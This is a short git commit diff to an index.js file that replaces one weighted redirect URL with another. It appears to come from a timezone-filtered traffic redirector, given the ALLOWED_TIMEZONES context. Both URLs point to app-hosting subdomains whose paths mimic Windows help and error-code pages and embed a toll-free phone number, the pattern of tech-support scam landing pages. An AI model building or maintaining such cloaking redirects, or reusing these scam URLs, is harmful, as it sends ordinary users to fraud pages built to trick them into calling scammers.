98b770bc1570972a208d4272b31be3676300d29d
paalakash <palaksh452@gmail.com>
2026-06-23 08:23:48 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-s7ccy.ondigitalocean.app/werrx01USAHTML/?bcda=1800 034 661", weight: 1.0 }
+    { url: "https://plankton-app-mp25n.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661", weight: 1.0 }
     
 ];
 
